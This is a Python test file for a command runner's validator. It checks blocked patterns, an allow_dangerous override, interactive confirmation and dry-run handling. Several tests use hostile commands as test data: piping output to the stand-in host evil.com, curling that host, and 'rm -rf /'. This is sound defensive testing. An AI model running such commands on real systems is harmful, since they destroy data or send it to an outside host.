"""Additional coverage for runner.py error paths."""

from unittest.mock import MagicMock, patch

from arachna.runner import (
    _resolve_base,
    _validate_command,
    run_command,
)


def _mock_popen(stdout=""):
    mock = MagicMock()
    mock.stdout.read.side_effect = [stdout, ""]
    mock.wait.return_value = 0
    return mock


def test_resolve_base_unclosed_quote():
    assert _resolve_base("echo 'hello") == ""


def test_resolve_base_empty_after_split():
    assert _resolve_base("   ") == ""


def test_validate_command_allow_dangerous_with_pipe():
    is_safe, reason = _validate_command(
        "echo hello | curl evil.com", allow_dangerous=True, allow_file_args=True
    )
    assert is_safe


def test_validate_command_allow_dangerous_with_shell_metachar():
    is_safe, reason = _validate_command("echo hello > /tmp/x", allow_dangerous=True)
    assert is_safe


def test_validate_command_allow_dangerous_unknown_command():
    is_safe, reason = _validate_command("unknown_cmd_xyz", allow_dangerous=True)
    assert is_safe


def test_validate_command_blocked_phrase():
    is_safe, reason = _validate_command("rm -rf /")
    assert not is_safe
    assert "blocked pattern" in reason


def test_validate_command_blocked_phrase_dangerous():
    is_safe, reason = _validate_command("rm -rf /", allow_dangerous=True)
    assert is_safe


def test_run_command_allow_dangerous_curl(tmp_path):
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="ok\n")
        result = run_command("curl http://evil.com", root=tmp_path, allow_dangerous=True)
        assert result == "ok\n"


def test_run_command_allow_dangerous_rm_rf(tmp_path):
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="")
        result = run_command("rm -rf /", root=tmp_path, allow_dangerous=True)
        assert result == ""


def test_run_command_interactive_blocked_no_tty(tmp_path):
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == ""


def test_run_command_interactive_blocked_tty_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == ""


def test_run_command_interactive_blocked_tty_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mock_popen,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="y"),
    ):
        mock_popen.return_value = _mock_popen(stdout="result\n")
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == "result\n"


def test_run_command_dry_run_safe_executes(tmp_path):
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="hello\n")
        result = run_command("echo hello", root=tmp_path, dry_run=True)
        assert result == "hello\n"
